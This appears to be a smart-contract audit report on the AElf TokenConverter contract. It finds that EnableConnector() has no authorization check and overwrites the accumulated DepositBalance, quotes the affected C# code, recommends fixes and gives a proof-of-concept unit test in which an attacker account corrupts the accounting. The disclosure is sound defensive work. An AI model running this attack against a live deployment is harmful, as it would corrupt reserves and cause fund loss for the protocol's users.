# Audit Report

## Title
DepositBalance Overwrite Vulnerability in EnableConnector Allows Accounting Corruption and Fund Loss

## Summary
The `EnableConnector()` function in the TokenConverter contract lacks authorization checks and directly overwrites the accumulated `DepositBalance` state without verifying if the connector is already enabled, allowing any attacker to corrupt deposit accounting and break the Bancor pricing mechanism.

## Finding Description

The `EnableConnector()` function contains three critical security flaws that enable accounting corruption:

**1. Missing Authorization Check**

The `EnableConnector()` function is a public method that lacks any authorization verification. [1](#0-0) 

In contrast, all other administrative functions properly implement authorization checks:
- `UpdateConnector` verifies caller permissions [2](#0-1) 
- `AddPairConnector` verifies caller permissions [3](#0-2) 
- `SetFeeRate` verifies caller permissions [4](#0-3) 

The authorization check implementation requires the caller to be the connector controller: [5](#0-4) 

**2. Direct Overwrite Without Checking Existing Balance**

The function directly assigns the calculated `needDeposit.NeedAmount` to `DepositBalance` at line 297, completely overwriting any previously accumulated value. [6](#0-5) 

This is a direct assignment operation (`=`), not an addition (`.Add()`). During normal trading operations, `DepositBalance` properly accumulates through `Buy()` operations using addition: [7](#0-6) 

And decreases through `Sell()` operations using subtraction: [8](#0-7) 

**3. No Re-enablement Prevention**

The function lacks any check to prevent calling it on already-enabled connectors. Compare this to `UpdateConnector`, which explicitly prevents modifications to activated connectors: [9](#0-8) 

**Attack Mechanism:**

The Bancor pricing mechanism relies on `GetSelfBalance()`, which for deposit accounts directly returns the `DepositBalance` value: [10](#0-9) 

When an attacker calls `EnableConnector()` on an already-enabled connector, the `GetNeededDeposit()` calculation recalculates the deposit amount: [11](#0-10) 

The calculated `needDeposit.NeedAmount` can be minimal or zero depending on the current token supply distribution, and the overwrite operation at line 297 destroys the accumulated balance, creating an accounting mismatch where physical reserves no longer match tracked reserves.

## Impact Explanation

**Critical Severity:**

1. **Direct Fund Loss:** After trading accumulates DepositBalance to 500,000 ELF, an attacker can reset it to a minimal value. The contract physically holds 500,000 ELF but accounting shows a corrupted amount, making funds effectively untracked and lost to the protocol.

2. **Bancor Pricing Corruption:** All subsequent Buy/Sell operations use `GetSelfBalance()` for price calculations. Since this returns the corrupted `DepositBalance`, all pricing becomes incorrect, causing incorrect exchange rates, potential underflow errors in Sell operations, and complete breakdown of the automated market maker functionality.

3. **Reserve Invariant Violation:** The fundamental invariant `physical_reserves == tracked_reserves` is permanently broken. This is a critical accounting corruption that cannot be recovered without administrative intervention.

4. **Protocol Insolvency:** The protocol appears insolvent as tracked reserves do not reflect actual holdings, destroying user confidence.

## Likelihood Explanation

**High Likelihood:**

1. **No Authorization Barrier:** Any address can call `EnableConnector()` - there are zero permission checks preventing public access.

2. **Minimal Attack Complexity:** The attack requires a single transaction with easily obtainable parameters (just a known token symbol).

3. **No Special Prerequisites:** The attacker only needs knowledge of an enabled connector's token symbol (publicly visible) and sufficient gas for transaction execution.

4. **Economic Incentives:** Griefing attacks to damage protocols or creating market chaos for trading advantage, with minimal cost (only gas).

## Recommendation

Add three protections to `EnableConnector()`:

1. **Add Authorization Check:** Call `AssertPerformedByConnectorController()` at the beginning of the function to ensure only authorized addresses can enable connectors.

2. **Add Re-enablement Check:** Add an assertion to prevent re-enabling already active connectors:
```csharp
Assert(!toConnector.IsPurchaseEnabled && !fromConnector.IsPurchaseEnabled, 
    "Connector is already enabled");
```

3. **Use Additive Assignment:** Change line 297 to use `.Add()` instead of direct assignment, or ensure the function can only be called once per connector.

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Accounting_Corruption_Attack()
{
    // Setup: Initialize contract and create connector pair
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "ATTACK";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 100_0000_0000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });

    // Enable connector initially with proper deposit
    var initialConnectorInfo = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 100_0000_0000
    };
    await DefaultStub.EnableConnector.SendAsync(initialConnectorInfo);

    // Simulate trading that accumulates DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput { Symbol = tokenSymbol, Amount = 50_0000 });
    var ntSymbol = $"(NT){tokenSymbol}";
    var balanceAfterBuy = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    balanceAfterBuy.ShouldBeGreaterThan(100); // DepositBalance has accumulated

    // ATTACK: Any attacker can call EnableConnector again to corrupt accounting
    var attackerStub = GetTokenConverterContractStub(Accounts[1].KeyPair);
    var attackResult = await attackerStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0
    });
    attackResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);

    // Verify: DepositBalance has been corrupted (overwritten)
    var balanceAfterAttack = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    balanceAfterAttack.ShouldNotBe(balanceAfterBuy); // Accounting corrupted!
    // Physical reserves still hold the original amount, but tracking is now wrong
}
```

## Notes

This vulnerability represents a critical break in the TokenConverter contract's accounting integrity. The combination of missing authorization, direct state overwrite, and lack of re-enablement protection creates a trivially exploitable attack vector that can permanently corrupt the Bancor pricing mechanism and result in effective fund loss. The fix requires adding proper authorization checks and preventing re-enablement of already active connectors.

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L79-81)
```csharp
    public override Empty AddPairConnector(PairConnectorParam input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L260-262)
```csharp
    public override Empty SetFeeRate(StringValue input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L397-403)
```csharp
    private void AssertPerformedByConnectorController()
    {
        if (State.ConnectorController.Value == null) State.ConnectorController.Value = GetDefaultConnectorController();

        Assert(Context.Sender == State.ConnectorController.Value.OwnerAddress,
            "Only manager can perform this action.");
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L56-91)
```csharp
    public override DepositInfo GetNeededDeposit(ToBeConnectedTokenInfo input)
    {
        var toConnector = State.Connectors[input.TokenSymbol];
        Assert(toConnector != null && !toConnector.IsDepositAccount, "[GetNeededDeposit]Can't find to connector.");
        var fromConnector = State.Connectors[toConnector.RelatedSymbol];
        Assert(fromConnector != null, "[GetNeededDeposit]Can't find from connector.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(
            new GetTokenInfoInput
            {
                Symbol = input.TokenSymbol
            });
        var balance = State.TokenContract.GetBalance.Call(
            new GetBalanceInput
            {
                Owner = Context.Self,
                Symbol = input.TokenSymbol
            }).Balance;
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }

        return new DepositInfo
        {
            NeedAmount = needDeposit,
            AmountOutOfTokenConvert = amountOutOfTokenConvert
        };
    }
```
